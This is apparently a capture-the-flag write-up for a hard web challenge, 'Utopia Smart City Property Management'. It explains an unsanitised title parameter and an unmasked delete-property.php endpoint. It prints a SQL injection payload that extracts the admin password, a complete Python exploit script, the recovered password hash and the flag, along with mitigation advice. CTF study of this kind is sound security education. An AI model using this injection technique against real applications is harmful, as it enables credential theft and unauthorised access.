# Utopia Smart City Property Management - Web Challenge

## Challenge Information
- **Name**: Utopia Smart City Property Management
- **Category**: Web
- **Difficulty**: Hard
- **Points**: 450
- **Instance**: https://c56940ae846bb4ff.chal.ctf.ae
- **Flag**: `flag{fcda96c115ac0e55}`
- **Status**: ✅ SOLVED (after 3.5 hours)

## Challenge Description
A property management system for Utopia Smart City with SQL injection vulnerability and an unmasked data endpoint.

## Quick Start

### Run the exploit:
```bash
python3 exploit_final_solution.py
```

## Vulnerability Summary

This challenge involved exploiting a SQL injection vulnerability in the `title` parameter combined with discovering an unmasked endpoint (`delete-property.php`) that revealed injected data.

### Key Vulnerabilities

1. **SQL Injection in add_property()**: The `title` parameter is NOT sanitized
2. **Incomplete Input Validation**: Filter doesn't block critical SQL keywords like `select`, `from`, `where`
3. **Unmasked Data Endpoint**: `delete-property.php` displays data without masking (unlike other endpoints)

## Vulnerability Analysis

### SQL Injection in `add_property()` Function

```php
function add_property($data) {
    global $conn;
    
    $title = $data['title'];  // NOT ESCAPED!
    $description = $conn->real_escape_string($data['description']);
    // ... other fields ARE escaped ...
    
    $sql = "INSERT INTO properties (..., title) 
            VALUES (..., '$title')";
    
    return $conn->query($sql);
}
```

### Critical Discovery: Unmasked Endpoint

**delete-property.php** displays data WITHOUT masking:
```php
<h3><?= htmlspecialchars($property['title']) ?></h3>
<p><strong>Address:</strong> <?= htmlspecialchars($property['address']) ?></p>
```

**Other endpoints MASK data**:
```php
// dashboard.php, property.php, edit-property.php
<?= $is_admin ? htmlspecialchars($property['title']) : str_repeat('*', min(30, strlen($property['title']))) ?>
```

## Exploitation Strategy

### Step 1: Craft SQL Injection Payload

Inject admin password into a new property row:

```sql
test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select password from users where username='admin'))-- -
```

**How it works**:
1. `test')` - Closes current title value
2. `, (` - Starts new row in VALUES clause
3. Dummy values for other columns
4. `(select password from users where username='admin')` - Extracts admin password
5. `-- -` - Comments out rest of query

### Step 2: Extract Password via delete-property.php

Since `delete-property.php` doesn't mask data:
1. Create malicious property with SQL injection
2. Navigate to `delete-property.php` for each property
3. Read unmasked title containing admin password

### Step 3: Login as Admin

Use extracted password:
- Username: `admin`
- Password: `5e3cd1bf355f6eada62f721f0ebaf54f`

### Step 4: Retrieve Flag

Admin dashboard displays the flag from `getenv('FLAG')`.

## Complete Exploit

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "https://c56940ae846bb4ff.chal.ctf.ae"

def exploit():
    # Step 1: Login as guest
    session = requests.Session()
    session.post(f"{BASE_URL}/login.php", 
                data={"username": "guest", "password": "guest"})
    
    # Step 2: Inject admin password via SQL injection
    payload = "test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select password from users where username='admin'))-- -"
    
    data = {
        "title": payload,
        "description": "test",
        "address": "test",
        "price": "1000",
        "property_type": "apartment",
        "bedrooms": "1",
        "bathrooms": "1",
        "area_sqft": "500",
        "amenities": "test",
        "contact_info": "test"
    }
    
    session.post(f"{BASE_URL}/add-property.php", data=data)
    
    # Step 3: Extract password via delete-property.php
    dash = session.get(f"{BASE_URL}/dashboard.php")
    ids = re.findall(r'property\.php\?id=(\d+)', dash.text)
    
    admin_password = None
    for prop_id in ids[:10]:
        del_resp = session.post(f"{BASE_URL}/delete-property.php", 
                               data={"property_id": prop_id})
        title_match = re.search(r'<h3>(.*?)</h3>', del_resp.text, re.DOTALL)
        
        if title_match:
            title = title_match.group(1).strip()
            if len(title) == 32 and all(c in '0123456789abcdef' for c in title.lower()):
                admin_password = title
                break
    
    # Step 4: Login as admin
    admin_session = requests.Session()
    admin_session.post(f"{BASE_URL}/login.php", 
                      data={"username": "admin", "password": admin_password})
    
    # Step 5: Get flag
    admin_dash = admin_session.get(f"{BASE_URL}/dashboard.php")
    flag_match = re.search(r"<b id='flag'>\s*(.*?)\s*<", admin_dash.text, re.DOTALL)
    
    if flag_match:
        flag = flag_match.group(1).strip()
        print(f"FLAG: {flag}")
        return flag

if __name__ == "__main__":
    exploit()
```

## Why Previous Attempts Failed

1. **Focused on wrong endpoints**: Tried extracting data from `dashboard.php` and `property.php` which mask data
2. **Overlooked delete-property.php**: The critical unmasked endpoint
3. **Tried complex blind SQLi**: When simple data exfiltration was possible

## Key Insights

### The Critical Mistake in the Code

Developers:
1. ✅ Implemented data masking in most endpoints
2. ✅ Used prepared statements for most queries
3. ✅ Implemented SQL filtering (though incomplete)
4. ❌ **Forgot to mask data in delete-property.php**
5. ❌ **Forgot to sanitize the title parameter**

## Lessons Learned

### For CTF Players

1. **Enumerate ALL endpoints**: Don't assume all endpoints have same security controls
2. **Check for inconsistencies**: Look for places where security measures aren't uniformly applied
3. **Simple is better**: Sometimes solution is simpler than complex blind SQL injection

### For Developers

1. **Consistent input validation**: ALL user inputs must be sanitized
2. **Use prepared statements**: Always use parameterized queries
3. **Consistent access controls**: Apply security measures uniformly across all endpoints
4. **Defense in depth**: Multiple layers of security must be complete

## Proper Mitigation

### 1. Use Prepared Statements

```php
$stmt = $conn->prepare("INSERT INTO properties (..., title) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bind_param("ssdsiiiiss", $description, $address, $price, $property_type, 
                  $bedrooms, $bathrooms, $area_sqft, $amenities, $contact_info, $title);
$stmt->execute();
```

### 2. Implement Consistent Data Masking

```php
// In delete-property.php
if (!SessionManager::isAdmin()) {
    $property['title'] = str_repeat('*', strlen($property['title']));
    $property['address'] = str_repeat('*', strlen($property['address']));
}
```

## Timeline

- **Initial Analysis**: 30 minutes - Identified SQL injection
- **Failed Attempts**: 3 hours - Tried various blind SQLi techniques (40+ attempts)
- **Breakthrough**: 5 minutes - Discovered delete-property.php doesn't mask data
- **Exploitation**: 2 minutes - Extracted password and retrieved flag

**Total Time**: ~3.5 hours (could have been 40 minutes with right approach!)

## Files

- **exploit_final_solution.py** - Working exploit
- **FINAL_WRITEUP.md** - Comprehensive analysis of all attempts
- **SOLUTION.md** - Detailed solution walkthrough
- **src/** - Challenge source code
- Various other exploit attempts and documentation

## Statistics

- **Attempts before solution**: 40+
- **Scripts created**: 22
- **Lines of code written**: 2500+
- **Key insight**: delete-property.php doesn't mask data
- **Admin password**: 5e3cd1bf355f6eada62f721f0ebaf54f

## Flag

```
flag{fcda96c115ac0e55}
```

---

**Challenge Rating**: ⭐⭐⭐⭐☆ (4/5)  
**Difficulty**: The vulnerability was easy to find, but the solution required discovering the unmasked endpoint.
